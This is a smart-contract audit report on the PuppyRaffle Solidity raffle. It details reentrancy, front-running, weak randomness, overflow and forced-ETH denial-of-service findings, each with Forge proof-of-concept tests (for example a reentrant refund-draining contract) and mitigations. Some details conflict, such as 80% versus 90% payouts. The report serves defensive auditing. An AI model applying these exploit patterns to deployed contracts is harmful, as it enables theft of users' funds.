# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**  

PuppyRaffle is a Solidity-based ERC-721 raffle that lets users compete for a randomly generated “puppy” NFT.  

• Entering: Anyone calls `enterRaffle(address[] participants)` and pays `entranceFee` (1 ETH) per address supplied. Duplicate addresses in the same or previous rounds are rejected, letting a single wallet buy multiple legitimate tickets.  

• Refunds: A ticket holder may call `refund(index)` before the draw to reclaim their stake; the address is zeroed in the players array, preserving array order while freeing the slot.  

• Draw: After `raffleDuration` (default 1 day) and with ≥ 4 active players, `selectWinner()` can be triggered. 90 % of pooled ETH is sent to the winner, 10 % accrues to `totalFees` for the `feeAddress`. A new ERC-721 token is minted to the winner with rarity determined by pseudo-randomness; `tokenURI` serves on-chain JSON containing name, description and image link.  

• Fees: When no players are active, owner calls `withdrawFees()` to move accumulated fees to the designated address; `changeFeeAddress()` lets the owner update that wallet.  

Comprehensive Forge tests and a deployment script are included.
## High Risk Findings
[H-1]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
[H-2]. DOS issue in PuppyRaffle::enterRaffle
[H-3]. Reentrancy issue in PuppyRaffle::refund
[H-4]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Medium Risk Findings
[M-1]. Randomness issue in PuppyRaffle::selectWinner


### Number of Findings
- C: 0
- H: 5
- M: 1
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner

## Description
Winner selection is MEV/front‑runnable: Anyone can call selectWinner(), and the outcome depends on msg.sender, block.timestamp, and block.difficulty. An attacker monitoring the mempool can front‑run another user's selectWinner() to change the result in their favor, or repeatedly attempt selection at favorable timestamps.

Vulnerable code snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

Because msg.sender is part of the entropy, the caller controls a direct input to winnerIndex and can race a victim's transaction.

## Impact
Because `selectWinner()` distributes 80 % of all users’ ticket ETH to the address chosen by the on-chain RNG, a caller that can influence the entropy can divert the whole prize pool (and the newly-minted NFT) to themselves. This is a direct theft of user funds, not merely a fairness issue.

## Proof of Concept
1. Four honest users have entered the raffle and the duration has expired.
2. User A locally brute-forces what `winnerIndex` they would obtain for each possible `msg.sender` they control (they can quickly deploy many contracts or use CREATE2 addresses).
3. As soon as another user’s `selectWinner()` tx appears in the mempool, A sends their own `selectWinner()` with a higher gas price from the pre-computed address that makes them the winner.
4. A’s tx is mined first, transferring 80 % of the pot to A and minting the NFT to A.  `players` is then deleted, so the honest transaction reverts with “Need at least 4 players”.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract WinnerManipulationTest is Test {
    PuppyRaffle raffle;
    address[4] players = [address(0xA1), address(0xB2), address(0xC3), address(0xD4)];

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEe), 1 days);
        for (uint256 i; i < 4; i++) {
            vm.deal(players[i], 1 ether);
            address[] memory arr = new address[](1);
            arr[0] = players[i];
            vm.prank(players[i]);
            raffle.enterRaffle{value: 1 ether}(arr);
        }
        // fast-forward so raffle can be drawn
        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);
    }

    function _calcIndex(address caller) internal view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % players.length;
    }

    function testAttackerFrontRunsAndWins() public {
        // Honest user wants to trigger the draw
        address honest = address(0xB2);
        address attacker = address(0xC3);
        // Show that honest call would give some other winner
        uint256 honestIdx = _calcIndex(honest);
        uint256 attackerIdx = _calcIndex(attacker);
        assertTrue(honestIdx != attackerIdx, "different callers produce different winners");

        // Attacker front-runs
        vm.prank(attacker);
        raffle.selectWinner();

        // The previousWinner stored in contract must equal players[attackerIdx]
        assertEq(raffle.previousWinner(), players[attackerIdx]);

        // Pot (4 ether * 80%) should now be in attacker balance
        assertEq(attacker.balance, 3.2 ether);
    }
}

## Suggested Mitigation
Remove `msg.sender` from the entropy source and rely on an unpredictable oracle such as Chainlink VRF, RANDAO, or a commit-reveal scheme. If VRF is used, make `selectWinner()` callable only by the VRF coordinator so that the result cannot be influenced by arbitrary callers.

## [H-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
Permanent DoS of entering after multiple refunds: The duplicate check in enterRaffle compares all pairs across the entire players array, including refunded slots that are set to address(0). After two or more refunds, there will be multiple address(0) entries, causing the duplicate check to always revert.

Vulnerable code snippet:

function enterRaffle(address[] memory newPlayers) public payable {
    ...
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    ...
}

function refund(uint256 playerIndex) public {
    ...
    players[playerIndex] = address(0); // creates duplicate zero entries over time
}

This makes the raffle unusable once two or more refunds have occurred and length < 4, since no new entries can pass the duplicate check.

## Impact
New entries can be permanently blocked (revert) after multiple players refund, preventing the raffle from ever reaching 4 active participants and halting the protocol until a redeploy.

## Proof of Concept
1) Three users enter: players = [A, B, C].
2) A and B refund, turning their slots into zero addresses: players = [0x0, 0x0, C].
3) Any subsequent call to enterRaffle will revert in the duplicate check because players contains two equal entries (both address(0)).
4) Protocol cannot reach 4 active players; selectWinner() can never be called successfully in future rounds.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract DuplicateZeroDoSTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEe);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
        // Enter 3 unique players
        for (uint160 i = 1; i <= 3; i++) {
            address p = address(i);
            vm.deal(p, 1 ether);
            address[] memory arr = new address[](1);
            arr[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: 1 ether}(arr);
        }
    }

    function testDuplicateZeroBlocksFutureEnters() public {
        // Refund two different players, creating 2 zeros
        // Refund player at index 0
        vm.prank(address(1));
        raffle.refund(0);
        // Refund player at index 1
        vm.prank(address(2));
        raffle.refund(1);

        // Now attempt to add a new player
        address newcomer = address(1000);
        vm.deal(newcomer, 1 ether);
        address[] memory arr = new address[](1);
        arr[0] = newcomer;

        vm.prank(newcomer);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: 1 ether}(arr);
    }
}


## Suggested Mitigation
- Exclude address(0) from duplicate checks or avoid leaving holes in the players array.
- Prefer swapping-and-popping on refund to remove the refunded address:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Remove by swap & pop
    uint256 last = players.length - 1;
    if (playerIndex != last) {
        players[playerIndex] = players[last];
    }
    players.pop();

    payable(msg.sender).sendValue(entranceFee);
    emit RaffleRefunded(playerAddress);
}

- Alternatively, maintain a mapping of active entrants and only check duplicates against that mapping, ignoring address(0) entries.

## [H-3]. Reentrancy issue in PuppyRaffle::refund

## Description
Reentrancy in refund: External call before state update allows a malicious player to re-enter refund() from their fallback/receive function and drain multiple entranceFee amounts from the contract balance.

Vulnerable code snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // External call before effects

    players[playerIndex] = address(0); // State update after external call (unsafe)
    emit RaffleRefunded(playerAddress);
}

Address.sendValue forwards all available gas in Solidity >=0.7, making reentrancy feasible.

## Impact
A malicious participant can receive multiple refunds for a single ticket, stealing funds from the contract that belong to other players and/or the prize/fee pool.

## Proof of Concept
1) Attacker enters the raffle via a contract (AttackRefund) so that players[playerIndex] is the attacker contract.
2) Other honest players also enter to fund the contract with sufficient ETH.
3) Attacker calls refund(playerIndex). The contract sends entranceFee to the attacker contract before clearing the player's slot.
4) In the attacker's receive() function, immediately re-enter refund(playerIndex) again while the storage still shows the attacker as active.
5) Repeat re-entries to receive multiple refunds.
6) After reentrancy finishes, the attacker ends with a net profit of multiple entrance fees; players[playerIndex] is finally set to 0 once the outermost call completes.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6 <0.8.0;

import "../src/PuppyRaffle.sol";

interface IPuppyRaffle {
    function enterRaffle(address[] memory newPlayers) external payable;
    function refund(uint256 playerIndex) external;
}

contract AttackRefund {
    IPuppyRaffle public raffle;
    uint256 public idx;
    uint256 public counter;
    uint256 public limit;

    constructor(IPuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function enroll(uint256 _idx) external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: msg.value}(arr);
        idx = _idx;
    }

    function start(uint256 _limit) external {
        limit = _limit;
        raffle.refund(idx);
    }

    receive() external payable {
        if (counter < limit) {
            counter++;
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest {
    // helper to receive ether from the test runner
    receive() external payable {}

    function testRefundReentrancyStealsFunds() public {
        // Deploy raffle with 1 ether entrance fee
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(0xBEEF), 1 days);

        // Deploy attacker and fund it with 1 ether for the ticket
        AttackRefund attacker = new AttackRefund(IPuppyRaffle(address(raffle)));
        (bool sent,) = address(attacker).call{value: 1 ether}("");
        require(sent, "fund attacker failed");

        // Attacker buys a single ticket (player index 0)
        attacker.enroll{value: 1 ether}(0);

        // Top-up raffle with additional 3 ether so there is money to steal
        (bool topUp,) = address(raffle).call{value: 3 ether}("");
        require(topUp, "fund raffle failed");

        uint256 balanceBefore = address(attacker).balance;

        // Re-enter twice → total of three refunds
        attacker.start(2);

        uint256 gained = address(attacker).balance - balanceBefore;
        // Expect 3 * entranceFee = 3 ether profit
        require(gained == 3 ether, "Reentrancy did not yield expected profit");
    }
}

## Suggested Mitigation
- Apply the checks-effects-interactions pattern and/or a reentrancy guard.
- Update state before external calls and consider pull-based withdrawals.

Example fix:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    players[playerIndex] = address(0); // Effects first
    payable(msg.sender).sendValue(entranceFee); // Interaction after state update
    emit RaffleRefunded(playerAddress);
}

Alternatively, use a withdraw pattern: record a refundable balance and let users withdraw in a separate call.

## [H-4]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
Fee accounting uses a 64-bit accumulator with unchecked casts, leading to overflow/truncation and broken withdrawals.

Vulnerable code snippet:

totalFees = totalFees + uint64(fee);

Where fee = (totalAmountCollected * 20) / 100. With entranceFee and number of players large enough, fee exceeds 2^64-1 (≈1.84e19 wei ≈ 18.4 ETH) and is truncated when cast to uint64. This causes totalFees to wrap, desynchronizing it from the actual contract balance. Since withdrawFees() requires address(this).balance == uint256(totalFees), fees become permanently unwithdrawable.

## Impact
Fee truncation leads to accounting corruption; withdrawFees() will revert forever due to the strict equality check, locking accumulated fees in the contract.

## Proof of Concept
1) Deploy with a high entranceFee (e.g., 100 ether).
2) Have 4 players enter (totalAmountCollected = 400 ether, fee = 80 ether).
3) fee is converted to uint64 and added to totalFees, truncating to (80 ether mod 2^64).
4) After selectWinner(), address(this).balance holds 80 ether fees, but totalFees is truncated and smaller.
5) withdrawFees() requires exact equality and reverts, bricking fee withdrawal.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract TotalFeesOverflowTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        // entranceFee = 100 ETH -> single round fee = 80 ETH (> 2^64-1 wei ~ 18.4 ETH)
        raffle = new PuppyRaffle(100 ether, address(0xFEe), 1 days);
        // 4 players enter
        for (uint160 i = 1; i <= 4; i++) {
            address p = address(i);
            vm.deal(p, 100 ether);
            address[] memory arr = new address[](1);
            arr[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: 100 ether}(arr);
        }
        vm.warp(block.timestamp + 1 days + 1);
        vm.difficulty(1);
    }

    function testTotalFeesTruncatesAndBricksWithdraw() public {
        // Call selectWinner
        vm.prank(address(0xBEEF));
        raffle.selectWinner();

        // totalFees is uint64; compute truncated expected
        uint64 truncated = uint64(uint256(80 ether));
        uint64 onchainFees = raffle.totalFees();
        assertEq(onchainFees, truncated, "fees truncated to uint64");
        assertTrue(uint256(onchainFees) != uint256(80 ether), "onchain fees not equal to actual fees");

        // Forced equality check should fail due to mismatch
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Use a 256-bit accumulator and checked math (or upgrade to Solidity >=0.8 with default checked arithmetic). Avoid narrowing casts for monetary values.

Example fix:

uint256 public totalFees; // uint256, not uint64
...
function selectWinner() external {
    ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees += fee; // uint256 arithmetic
    ...
}

Also reconsider the strict equality check in withdrawFees (see UnexpectedEth finding).

## [H-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
Strict balance equality in withdrawFees is brittle and can be broken by forced ETH, permanently bricking fee withdrawals.

Vulnerable code snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

An attacker can force-send ETH via selfdestruct to make the contract balance greater than totalFees, causing the equality check to fail permanently.

## Impact
Because anyone can force-send a single wei, the strict equality guard in withdrawFees() will never pass again. All ETH already collected as fees – plus every fee accrued in all future raffle rounds – becomes unrecoverable, permanently bricking the protocol’s revenue stream.

## Proof of Concept
1) Run a normal round to accumulate fees.
2) Before withdrawFees() is called, attacker selfdestructs a contract sending 1 wei to PuppyRaffle.
3) address(this).balance > totalFees. withdrawFees() reverts forever with "There are currently players active!".

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract ForceSend {
    function boom(address payable to) external payable {
        selfdestruct(to);
    }
}

contract ForcedEthDoSTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEe);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
        // 4 players enter
        for (uint160 i = 1; i <= 4; i++) {
            address p = address(i);
            vm.deal(p, 1 ether);
            address[] memory arr = new address[](1);
            arr[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: 1 ether}(arr);
        }
        vm.warp(block.timestamp + 1 days + 1);
        vm.difficulty(1);
        // Select a winner so players are cleared and fees accrued
        vm.prank(address(0xBEEF));
        raffle.selectWinner();
    }

    function testForcedEthBreaksWithdrawFees() public {
        // Force send 1 wei to the raffle
        ForceSend fs = new ForceSend();
        vm.deal(address(fs), 1);
        fs.boom{value: 1}(payable(address(raffle)));
        // Now withdrawFees should revert due to strict equality check
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Do not rely on address(this).balance == totalFees to infer absence of active players.
- Track active player count/escrowed deposits explicitly and use that to gate withdrawals (e.g., require(activePlayers == 0)).
- Alternatively, withdraw exactly totalFees regardless of additional balance and maintain a separate accounting balance for fees vs. player deposits:

require(activePlayers == 0, "players active");
uint256 feesToWithdraw = totalFees;
totalFees = 0;
(bool ok,) = feeAddress.call{value: feesToWithdraw}("");
require(ok, "withdraw failed");



# Medium Risk Findings

## [M-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
Predictable and manipulable randomness for winner selection and NFT rarity. The RNG uses only msg.sender, block.timestamp, and block.difficulty. Callers can choose msg.sender and when to call (timestamp), and validators can influence block.difficulty (prevrandao), enabling outcome manipulation and MEV.

Vulnerable code snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
...
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

Anyone can call selectWinner() and choose a favorable time/address to skew winnerIndex; validators can also skew rarity via prevrandao (block.difficulty on PoS).

## Impact
Because the winner selection and rarity calculations rely only on values that either (1) the transaction sender fully controls (msg.sender), or (2) a block producer can influence (block.timestamp, block.difficulty == prevrandao), the draw is not cryptographically random. A searcher can increase their expected winning probability by submitting multiple selectWinner() transactions from different addresses in the same block and letting the builder keep only the transaction that makes them winner (MEV "transaction stuffing"). A validator / builder that decides the final prevrandao can bias both the winner and the NFT rarity outright. This breaks the economic fairness promised to players and can divert a large portion of the pooled ETH and rare NFTs to the manipulator.

## Proof of Concept
Scenario A – Searcher front-runs with many candidate calls
1. Raffle has ended (raffleDuration passed) and ≥4 players are registered, including several addresses controlled by the attacker (addr1 … addrN).
2. Off-chain, the attacker computes for each owned address `i` the value `winnerIndex_i = keccak256(addr_i, t, d) % players.length`, leaving `t` and `d` unknown.
3. The attacker builds M transactions that each call selectWinner() from a different address (addr1 … addrM) and sends them **with the same gas price** to the mempool right after the raffle closed.
4. A sophisticated MEV relay / builder keeps these transactions in a private bundle. When the block is being built the builder knows the final `prevrandao` (what block.difficulty returns) and block.timestamp, so it can evaluate which of the M transactions makes its address the winner.
5. Only that profitable transaction is kept in the bundle; the others are discarded. The attacker therefore appears once in the block and wins with much higher probability than 1/players.length.

Scenario B – Validator control
A validator that produces the block can simply choose the block’s prevrandao value (within the allowed BLS-based randomness) after observing the single selectWinner() call already placed in the block. They iterate until the hash maps to their own index or until the rarity hash yields a legendary puppy, then finalise the block, guaranteeing the desired outcome.

Either path demonstrates that the "randomness" can be biased without needing impossible abilities such as setting timestamp or difficulty directly from a normal account.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEe);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
        // Add 4 players including attacker
        address attacker = address(0xA11CE);
        address[3] memory others = [address(0xBEEF), address(0xCAFE), address(0xD00D)];
        // fund
        vm.deal(attacker, 1 ether);
        for (uint256 i = 0; i < 3; i++) vm.deal(others[i], 1 ether);
        // enter all
        address[] memory arr = new address[](1);
        arr[0] = attacker; vm.prank(attacker); raffle.enterRaffle{value: 1 ether}(arr);
        for (uint256 i = 0; i < 3; i++) { arr[0] = others[i]; vm.prank(others[i]); raffle.enterRaffle{value: 1 ether}(arr); }
        // advance time
        vm.warp(block.timestamp + 1 days + 1);
        vm.difficulty(1); // set known difficulty
    }

    function computeIndex(address caller, uint256 ts, uint256 diff, uint256 N) internal pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(caller, ts, diff))) % N;
    }

    function testAttackerPicksWinningTimestamp() public {
        address attacker = address(0xA11CE);
        uint256 targetIndex = 0; // attacker entered first -> index 0
        uint256 chosenTs = 0;
        uint256 N = 4;
        for (uint256 t = block.timestamp; t < block.timestamp + 10000; t++) {
            if (computeIndex(attacker, t, 1, N) == targetIndex) { chosenTs = t; break; }
        }
        assertTrue(chosenTs != 0, "no timestamp found in search window");
        vm.warp(chosenTs);
        // Attacker calls selectWinner and should be chosen
        vm.prank(attacker);
        raffle.selectWinner();
        assertEq(raffle.previousWinner(), attacker, "attacker forced themselves as winner by timing the call");
    }
}


## Suggested Mitigation
- Use a verifiable randomness source such as Chainlink VRF.
- Alternatively, use a commit-reveal scheme where the entropy includes values not known at the time of commitment, e.g., future blockhash, and prevent same-block influence.
- Do not let msg.sender directly influence entropy; require a two-step process or use an authorized randomness coordinator.



